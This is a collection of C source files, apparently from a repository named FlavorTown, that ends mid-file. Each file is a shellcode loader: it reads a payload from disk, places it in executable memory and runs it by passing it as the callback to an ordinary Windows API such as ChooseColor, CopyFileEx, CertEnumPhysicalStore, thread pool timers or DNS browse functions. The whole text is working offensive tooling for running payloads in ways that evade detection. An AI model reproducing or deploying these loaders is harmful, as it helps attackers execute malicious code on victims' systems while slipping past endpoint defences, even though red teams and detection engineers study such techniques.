#pragma comment(lib, "Imagehlp.lib")

#include <stdio.h>
#include <windows.h>
#include <imagehlp.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: BindImageEx.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	BindImageEx(BIND_NO_UPDATE, "C:\\windows\\notepad.exe", 
		NULL, NULL, (PIMAGEHLP_STATUS_ROUTINE)hAlloc);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CDefFolderMenu_Create2.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Shell32.lib")

#include <stdio.h>
#include <Windows.h>
#include <shlobj_core.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	
	if (argc != 2)
	{
		printf("Usage: CDefFolderMenu_Create2.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	PVOID ICM = NULL;
	CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, (LPFNDFMCALLBACK)hAlloc, 0, NULL, &ICM);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/CertCreateContext.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Crypt32.lib")

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: CertCreateContext.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	CERT_CREATE_CONTEXT_PARA sCertCreate = { 0 };
	sCertCreate.cbSize = sizeof(CERT_CREATE_CONTEXT_PARA);
	sCertCreate.pfnFree = hAlloc;

	CertCreateContext(CERT_STORE_CERTIFICATE_CONTEXT, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
		NULL, 0, CERT_CREATE_CONTEXT_NOCOPY_FLAG, &sCertCreate);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CertEnumPhysicalStore.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Crypt32.lib")

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: CertEnumPhysicalStore.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	CertEnumPhysicalStore(L"MY", CERT_SYSTEM_STORE_LOCAL_MACHINE, NULL, (PFN_CERT_ENUM_PHYSICAL_STORE)hAlloc);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CertFindChainInStore.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Crypt32.lib")

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HCERTSTORE hCertStore = NULL;
	CERT_CHAIN_FIND_ISSUER_PARA sCCFIP = { 0 };

	if (argc != 2)
	{
		printf("Usage: CertFindChainInStore.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, NULL, CERT_SYSTEM_STORE_CURRENT_USER, L"My");

	sCCFIP.pfnFindCallback = (PFN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK)hAlloc;
	sCCFIP.cbSize = sizeof(CERT_CHAIN_FIND_ISSUER_PARA);

	CertFindChainInStore(hCertStore, X509_ASN_ENCODING, 0, CERT_CHAIN_FIND_BY_ISSUER, &sCCFIP, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hCertStore)
		CertCloseStore(hCertStore, 0);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/ChooseColor.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: ChooseColor.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	CHOOSECOLOR sCC = { 0 };
	sCC.lStructSize = sizeof(CHOOSECOLOR);
	sCC.Flags = CC_ENABLEHOOK;
	sCC.lpfnHook = (LPCCHOOKPROC)hAlloc;

	ChooseColor(&sCC);
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/ChooseFont.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: ChooseFont.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	CHOOSEFONT sCF = { 0 };
	sCF.lStructSize = sizeof(sCF);
	sCF.Flags = CF_ENABLEHOOK;
	sCF.lpfnHook = (LPCFHOOKPROC)hAlloc;

	ChooseFont(&sCF);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/ClusWorkerCreate.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "ResUtils.lib")

#include <stdio.h>
#include <windows.h>
#include <resapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	CLUS_WORKER sCW = { 0 };

	if (argc != 2)
	{
		printf("Usage: ClusWorkerCreate.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	ClusWorkerCreate(&sCW, (PWORKER_START_ROUTINE)hAlloc, NULL);

	ClusWorkerTerminateEx(&sCW, INFINITE, TRUE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (sCW.hThread)
		CloseHandle(sCW.hThread);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CopyFileEx.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;

	if (argc != 2)
	{
		printf("Usage: CopyFileEx.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hFile = CreateFile(L"C:\\Windows\\Temp\\Blank.txt", FILE_READ_DATA, FILE_SHARE_READ,
		NULL, OPEN_ALWAYS, 0, NULL);

	CopyFileEx(L"C:\\Windows\\Temp\\Blank.txt", L"C:\\Windows\\Temp\\Blankagain.txt",
		(LPPROGRESS_ROUTINE)hAlloc, NULL, FALSE, 0);
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hFile)
		CloseHandle(hFile);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CopyFileTransacted.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "KtmW32.lib")

#include <stdio.h>
#include <windows.h>
#include <ktmw32.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	HANDLE hTransaction = NULL;

	if (argc != 2)
	{
		printf("Usage: CopyFileTransacted.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	//Create a file to copy
	hFile = CreateFile(L"C:\\Windows\\Temp\\Blank.txt", FILE_READ_DATA, FILE_SHARE_READ, 
		NULL, OPEN_ALWAYS, 0, NULL);

	CloseHandle(hFile);

	//Create copy transaction
	hTransaction = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	CopyFileTransacted(L"C:\\Windows\\Temp\\Blank.txt", L"C:\\Windows\\Temp\\Blankagain.txt", 
		(LPPROGRESS_ROUTINE)hAlloc, NULL, FALSE, 0x0, hTransaction);

	//Execute
	CommitTransaction(hTransaction);

	//Delete the files
	DeleteFile(L"C:\\Windows\\Temp\\Blank.txt");
	DeleteFile(L"C:\\Windows\\Temp\\Blankagain.txt");

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hTransaction)
		CloseHandle(hTransaction);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CreateThreadPoolTimer.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>
#include <threadpoolapiset.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	ULARGE_INTEGER ulDueTime = { 0 };
	FILETIME sFiletime = { 0 };
	PTP_TIMER TPTimer = NULL;

	if (argc != 2)
	{
		printf("Usage: CreateThreadpoolTimer.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	// Set the timer to fire in one second.

	ulDueTime.QuadPart = (ULONGLONG) -(10000000); 

	sFiletime.dwLowDateTime = ulDueTime.LowPart;
	sFiletime.dwHighDateTime = ulDueTime.HighPart;

	TPTimer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)hAlloc, NULL, NULL);

	SetThreadpoolTimer(TPTimer, &sFiletime, 0, 0);

    // Delay for the timer to be fired
	Sleep(1500);
	
    WaitForThreadpoolTimerCallbacks(TPTimer, FALSE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (TPTimer)
		CloseThreadpoolTimer(TPTimer);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/CreateThreadPoolWork.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>
#include <threadpoolapiset.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	PTP_WORK TPWork = NULL;

	if (argc != 2)
	{
		printf("Usage: CreateThreadpoolWork.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	TPWork = CreateThreadpoolWork(hAlloc, NULL, NULL);

	SubmitThreadpoolWork(TPWork);

	WaitForThreadpoolWorkCallbacks(TPWork, FALSE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (TPWork)
		CloseThreadpoolWork(TPWork);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/DSA_EnumCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comctl32.lib")

#include <stdio.h>
#include <windows.h>
#include <dpa_dsa.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HDSA hDSA = NULL;

	if (argc != 2)
	{
		printf("Usage: DSA_EnumCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	hDSA = DSA_Create(1, 1);

	//Need to add an item to the dynamic structure array
	DSA_AppendItem(hDSA, &hDSA);

	//Enum and execute
	DSA_EnumCallback(hDSA, (PFNDAENUMCALLBACK)hAlloc, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hDSA)
		DSA_Destroy(hDSA);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/DdeInitialize.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "User32.lib")

#include <stdio.h>
#include <windows.h>
#include <ddeml.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	DWORD idInst = 0;

	if (argc != 2)
	{
		printf("Usage: DdeInitialize.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	DdeInitialize(&idInst, (PFNCALLBACK)hAlloc, MF_CALLBACKS, 0);

	DdeConnect(idInst, 0, 0, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (idInst)
		DdeUninitialize(idInst);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/DirectDrawEnumerateExA.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Ddraw.lib")

#include <stdio.h>
#include <windows.h>
#include <ddraw.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: DirectDrawEnumerateExA.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	DirectDrawEnumerateExA((LPDDENUMCALLBACKEXA)hAlloc, NULL, 0);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/DnsServiceBrowse.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Dnsapi.lib")

#include <stdio.h>
#include <windows.h>
#include <windns.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: DnsServiceBrowse.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	DNS_SERVICE_BROWSE_REQUEST sDSBR = { 0 };
	sDSBR.Version = DNS_QUERY_REQUEST_VERSION1;
	sDSBR.pBrowseCallback = hAlloc;
	sDSBR.InterfaceIndex = 0;
	sDSBR.QueryName = L"localhost";
	sDSBR.pQueryContext = NULL;

	DNS_SERVICE_CANCEL sDSC = { 0 };
	
	DnsServiceBrowse(&sDSBR, &sDSC);

	Sleep(INFINITE);
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/DnsStartMulticastQuery.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "dnsapi.lib")

#include <stdio.h>
#include <windows.h>
#include <windns.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: DnsStartMulticastQuery.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MDNS_QUERY_REQUEST sMDNS = { 0 };
	sMDNS.Version = DNS_QUERY_REQUEST_VERSION1;
	sMDNS.ulRefCount = NULL;
	sMDNS.QueryType = DNS_TYPE_ZERO;
	sMDNS.QueryOptions = DNS_QUERY_STANDARD;
	sMDNS.InterfaceIndex = 0;
	sMDNS.Query = L"Wra7h"; //Doesn't seem to matter.
	sMDNS.pQueryCallback = hAlloc;
	sMDNS.pQueryContext = NULL;

	MDNS_QUERY_HANDLE sMDNSHandle = { 0 };

	DnsStartMulticastQuery(&sMDNS, &sMDNSHandle);
